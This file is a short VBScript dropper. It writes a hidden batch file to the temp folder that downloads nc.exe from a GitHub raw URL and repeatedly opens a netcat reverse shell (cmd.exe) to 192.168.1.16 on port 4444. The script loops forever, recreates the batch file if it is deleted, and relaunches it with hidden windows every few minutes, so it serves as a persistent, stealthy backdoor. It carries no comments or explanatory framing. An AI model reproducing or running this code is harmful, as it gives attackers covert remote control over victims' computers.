Dim batFilePath, objFSO, objFile, objShell
batFilePath = CreateObject("Scripting.FileSystemObject").GetSpecialFolder(2) & "\pro.bat"
Set objFSO = CreateObject("Scripting.FileSystemObject")
Do
   If Not objFSO.FileExists(batFilePath) Then
        Set objFile = objFSO.CreateTextFile(batFilePath, True)
        objFile.WriteLine "@echo off"
        objFile.WriteLine "curl https://raw.githubusercontent.com/omarsamyX0/shell4/main/nc.exe -o %temp%\nc.exe"
        objFile.WriteLine ":loop"
        objFile.WriteLine "powershell -c ""Start-Process -FilePath 'cmd.exe' -ArgumentList '/c %temp%\nc.exe -nv 192.168.1.16 4444 -e cmd.exe' -WindowStyle Hidden"""
        objFile.WriteLine "timeout /t 120 >nul"
        objFile.WriteLine "goto loop"
        objFile.Close
   End If
   Set objShell = CreateObject("WScript.Shell")
   objShell.Run "powershell -WindowStyle Hidden -Command ""Start-Process -FilePath '%temp%\pro.bat' -WindowStyle Hidden""", 0, False
   WScript.Sleep 180000
Loop
